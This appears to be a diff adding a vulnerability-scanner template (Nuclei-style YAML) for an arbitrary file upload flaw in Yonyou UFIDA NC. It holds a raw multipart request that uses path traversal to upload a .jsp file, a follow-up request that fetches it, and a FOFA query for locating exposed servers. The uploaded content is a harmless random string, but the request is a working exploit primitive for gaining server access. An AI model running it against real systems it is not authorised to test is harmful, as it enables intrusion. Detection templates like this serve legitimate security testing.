@@ -1,0 +1,50 @@
+id: yonyou-nc-uploadControl-fileupload
+info:
+  name: 用友 UFIDA NC uploadControl - fileupload
+  author: leadlife
+  severity: critical
+  description: 用友 NC uploadControl/uploadFile 接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限。
+  reference: 
+    - https://blog.csdn.net/weixin_41924764/article/details/139788383
+    - https://wiki.wy876.cn/#/%E7%94%A8%E5%8F%8BNC-uploadControl%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E
+  metadata:
+    verified: false
+    fofa-qeury: icon_hash="1085941792" || app="用友-UFIDA-NC"
+  tags: yonyou,nc,fileupload,oa
+
+variables:
+  num: '{{rand_int(800000000, 1000000000)}}'
+
+http:
+  - raw:
+      - |
+        POST /mp/initcfg/../uploadControl/uploadFile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: req/v3 (https://github.com/imroc/req)
+        Content-Length: 366
+        Content-Type: multipart/form-data; boundary=21e783bad5d805d7b2fe3e5ef7de7e6b0ed13740d4679092487968736c4c
+        Upgrade-Insecure-Requests: 1
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+
+        --21e783bad5d805d7b2fe3e5ef7de7e6b0ed13740d4679092487968736c4c
+        Content-Disposition: form-data; name="submit"
+
+        上传
+        --21e783bad5d805d7b2fe3e5ef7de7e6b0ed13740d4679092487968736c4c
+        Content-Disposition: form-data; name="file"; filename="{{num}}.jsp"
+        Content-Type: text/plain; charset=utf-8
+
+        {{randstr}}
+        --21e783bad5d805d7b2fe3e5ef7de7e6b0ed13740d4679092487968736c4c--
+
+      - |
+        GET /mp/uploadFileDir/{{num}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
